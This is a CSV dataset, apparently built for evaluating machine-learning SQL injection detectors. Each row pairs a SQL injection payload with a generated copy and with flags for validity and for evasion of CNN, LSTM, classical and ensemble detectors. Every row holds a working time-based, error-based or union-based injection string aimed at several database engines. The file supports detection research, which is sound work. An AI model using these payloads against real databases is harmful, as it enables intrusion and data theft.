,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
5401,"-6263%"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""","-6263%"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",1,1,0,0,0,0,0
5402,"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
5403,"1%"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--","1%"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,1,0,0,1,0,0
5404,"1))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","1))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",0,1,0,0,0,0,0
5405,"1"") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#","1"") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#",1,1,0,0,1,0,0
5406,"1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,1,0,0,1,0,0
5407,"1) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","1) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",0,1,0,0,0,0,0
5408,"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""gxhz""=""gxhz","1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""gxhz""=""gxhz",1,1,0,0,0,0,0
5409,"1' where 7445=7445 union all select null,null,null,null,null,null--","1' where 7445=7445 union all select null,null,null,null,null,null--",1,1,0,0,0,0,0
5410,"1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1,1,0,0,1,0,0
5411,1%' and sleep(5)#,1%' and sleep(5)#,1,1,0,0,0,0,0
5412,"1') where 4407=4407 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","1') where 4407=4407 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,1,0,0,0,0,0
5413,"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni","1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni",1,1,0,0,0,0,0
5414,"1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""","1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""",1,1,0,0,0,0,0
5415,"1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#","1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
5416,1') where 1645=1645 rlike sleep(5)--,1') where 1645=1645 rlike sleep(5)--,1,1,0,0,0,0,0
5417,"-9864"") or elt(5885=4936,4936) and (""bfbb"" like ""bfbb","-9864"") or elt(5885=4936,4936) and (""bfbb"" like ""bfbb",1,1,0,0,0,0,0
5418,"1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'","1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",1,1,0,0,0,0,0
5419,(select * from (select(sleep(5)))lrov),(select * from (select(sleep(5)))lrov),1,1,0,0,1,0,0
5420,1' rlike (select * from (select(sleep(5)))sgvo) and 'vnkr' like 'vnkr,1' rlike (select * from (select(sleep(5)))sgvo) and 'vnkr' like 'vnkr,1,1,0,0,0,0,0
5421,1')));select sleep(5) and ((('qjsc'='qjsc,1')));select sleep(5) and ((('qjsc'='qjsc,1,1,0,0,0,0,0
5422,"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1,1,0,0,0,0,0
5423,"1') where 2284=2284 and make_set(8403=8403,8899)--","1') where 2284=2284 and make_set(8403=8403,8899)--",1,1,0,0,0,0,0
5424,"1"";select sleep(5) and ""jvys"" like ""jvys","1"";select sleep(5) and ""jvys"" like ""jvys",1,1,0,0,0,0,0
5425,"1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--","1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--",1,1,0,0,0,0,0
5426,"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,1,0,0,0,0,0
5427,1)));select (case when (8331=5625) then 8331 else 8331*(select 8331 from mysql.db) end)#,1)));select (case when (8331=5625) then 8331 else 8331*(select 8331 from mysql.db) end)#,1,1,0,0,0,0,0
5428,"-1244) as qszw where 2332=2332 union all select 2332,2332,2332,2332#","-1244) as qszw where 2332=2332 union all select 2332,2332,2332,2332#",1,1,0,0,0,0,0
5429,1';if(8537=7034) select 8537 else drop function vqmp--,1';if(8537=7034) select 8537 else drop function vqmp--,1,1,0,0,0,0,0
5430,"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle","1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle",1,1,0,0,0,0,0
5431,"1%')) union all select null,null,null,null,null#","1%')) union all select null,null,null,null,null#",1,1,0,0,0,0,0
5432,"1'||(select 'nzjz' where 3539=3539 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1'||(select 'nzjz' where 3539=3539 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
5433,"1%"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""%""=""","1%"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""%""=""",1,1,0,0,0,0,0
5434,"1) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
5435,"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#","1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",1,1,0,0,0,0,0
5436,"1')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--","1')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--",1,1,0,0,0,0,0
5437,"1"")) union all select null,null#","1"")) union all select null,null#",1,1,0,0,0,0,0
5438,"1%"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""%""=""","1%"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""%""=""",1,1,0,0,0,0,0
5439,"1"" where 7879=7879;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","1"" where 7879=7879;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1,1,0,0,0,0,0
5440,1 where 4641=4641;select (case when (9540=5786) then 9540 else 9540*(select 9540 from information_schema.character_sets) end)#,1 where 4641=4641;select (case when (9540=5786) then 9540 else 9540*(select 9540 from information_schema.character_sets) end)#,1,1,0,0,0,0,0
5441,"-6581'||(select 'hpjd' where 7608=7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#","-6581'||(select 'hpjd' where 7608=7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",1,1,0,0,0,0,0
5442,"-9582') where 4397=4397 union all select 4397,4397,4397#","-9582') where 4397=4397 union all select 4397,4397,4397#",1,1,0,0,0,0,0
5443,1) and sleep(5)#,1) and sleep(5)#,0,1,0,0,0,0,0
5444,"1';select count(*) from generate_series(1,5000000)","1';select count(*) from generate_series(1,5000000)",1,1,0,0,1,0,0
5445,"1"")) and elt(3785=9386,9386) and ((""inwa"" like ""inwa","1"")) and elt(3785=9386,9386) and ((""inwa"" like ""inwa",1,1,0,0,0,0,0
5446,"1) union all select null,null,null,null--","1) union all select null,null,null,null--",1,1,0,0,0,0,0
5447,1'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||',1'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||',1,1,0,0,0,0,0
5448,"1%'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('%'='","1%'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('%'='",1,1,0,0,0,0,0
5449,1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),1,1,0,0,0,0,0
5450,"1') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","1') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,1,0,0,0,0,0
5451,"1"") as rcnk where 1800=1800;select sleep(5)--","1"") as rcnk where 1800=1800;select sleep(5)--",1,1,0,0,0,0,0
5452,"-5587%') or elt(1032=1032,3623) and ('%'='","-5587%') or elt(1032=1032,3623) and ('%'='",1,1,0,0,0,0,0
5453,1')) and 6690=3250#,1')) and 6690=3250#,1,1,0,0,0,0,0
5454,1%'));begin dbms_lock.sleep(5); end--,1%'));begin dbms_lock.sleep(5); end--,1,1,0,0,0,0,0
5455,1);select case when 7951=1147 then 1 else null end--,1);select case when 7951=1147 then 1 else null end--,1,1,0,0,0,0,0
5456,"1) as nxmd where 8650=8650;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","1) as nxmd where 8650=8650;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,1,0,0,0,0,0
5457,"1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","1' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1,1,0,0,0,0,0
5458,-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq,-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq,1,1,0,0,0,0,0
5459,"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)","1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",1,1,0,0,0,0,0
5460,"1) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","1) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,1,0,0,0,0,0
5461,"1%"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","1%"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,1,0,0,0,0,0
5462,"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""fbol"" like ""fbol","1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""fbol"" like ""fbol",1,1,0,0,0,0,0
5463,"-2726"")) or elt(1032=1032,3623) and ((""ococ""=""ococ","-2726"")) or elt(1032=1032,3623) and ((""ococ""=""ococ",1,1,0,0,0,0,0
5464,-4239 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- xacp,-4239 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- xacp,1,1,0,0,0,0,0
5465,1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--,1' in boolean mode);select (case when (8711=6432) then 1 else 8711*(select 8711 from master..sysdatabases) end)--,1,1,0,0,0,0,0
5466,"1')) or elt(6272=6272,sleep(5)) and (('fele'='fele","1')) or elt(6272=6272,sleep(5)) and (('fele'='fele",1,1,0,0,0,0,0
5467,"1'+(select kpso where 1226=1226 union all select null,null,null,null,null,null,null,null--","1'+(select kpso where 1226=1226 union all select null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
5468,1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||',1'||(select 'ypqa' where 1961=1961 or 6793=(select 6793 from pg_sleep(5)))||',1,1,0,0,0,0,0
5469,"-8349) union all select 8126,8126#","-8349) union all select 8126,8126#",1,1,0,0,0,0,0
5470,"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('cixa' like 'cixa","1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('cixa' like 'cixa",1,1,0,0,1,0,0
5471,"1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#","1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#",1,1,0,0,0,0,0
5472,"1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,1,0,0,0,0,0
5473,"-9779')) or make_set(9354=9354,7185) and (('hmzj'='hmzj","-9779')) or make_set(9354=9354,7185) and (('hmzj'='hmzj",1,1,0,0,0,0,0
5474,"1%"" or elt(6272=6272,sleep(5)) and ""%""=""","1%"" or elt(6272=6272,sleep(5)) and ""%""=""",1,1,0,0,0,0,0
5475,"1%"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""","1%"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",1,1,0,0,0,0,0
5476,"-4381 or make_set(6118=3095,3095)# lkcr","-4381 or make_set(6118=3095,3095)# lkcr",0,1,0,0,0,0,0
5477,"1'+(select 'opqr' where 2442=2442 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","1'+(select 'opqr' where 2442=2442 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
5478,"1;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","1;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,1,0,0,1,0,0
5479,"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('ymad' like 'ymad","1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('ymad' like 'ymad",1,1,0,0,0,0,0
5480,1' where 7176=7176;select pg_sleep(5)--,1' where 7176=7176;select pg_sleep(5)--,1,1,0,0,0,0,0
5481,-7962')) as pgqz where 6058=6058 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,-7962')) as pgqz where 6058=6058 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1,1,0,0,0,0,0
5482,1') or sleep(5) and ('kgbm'='kgbm,1') or sleep(5) and ('kgbm'='kgbm,1,1,0,0,0,0,0
5483,"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual# gnga","1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual# gnga",1,1,0,0,1,0,0
5484,"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'ukxj'='ukxj","1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'ukxj'='ukxj",1,1,0,0,0,0,0
5485,"1'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","1'))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,1,0,0,0,0,0
5486,"1""))) rlike sleep(5) and (((""qcqx"" like ""qcqx","1""))) rlike sleep(5) and (((""qcqx"" like ""qcqx",1,1,0,0,0,0,0
5487,1')) rlike sleep(5)#,1')) rlike sleep(5)#,1,1,0,0,0,0,0
5488,"-5898"")) as fycd where 7135=7135 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--","-5898"")) as fycd where 7135=7135 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,1,0,0,1,0,0
5489,"1)) as prnp where 4932=4932 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","1)) as prnp where 4932=4932 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",0,1,0,0,0,0,0
5490,1%')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',1%')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',1,1,0,0,0,0,0
